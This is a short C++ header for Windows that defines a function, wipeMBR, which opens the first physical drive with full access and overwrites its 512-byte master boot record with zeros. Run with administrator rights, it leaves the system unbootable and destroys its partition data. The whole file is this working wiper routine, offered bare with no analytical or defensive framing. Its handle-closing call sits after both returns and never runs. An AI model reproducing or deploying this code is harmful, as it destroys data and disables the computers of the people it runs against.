#pragma once

#ifndef WIPE_MBR_INCLUDED
#define WIPE_MBR_INCLUDED

#include <Windows.h>

// mbr size is 512 bytes
#define MBR_SIZE 512

bool wipeMBR()
{
	DWORD write;
	
	// array of data to write to the mbr (make a char array of size 512 bytes and zero it)
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, MBR_SIZE);

	// open handle for the mbr
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
	// write content of the mbrSize array to the mbr | if success, return true, otherwise return false
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL))
	{ return true; }
	else
	{ return false; }
	CloseHandle(MasterBootRecord);

}

#endif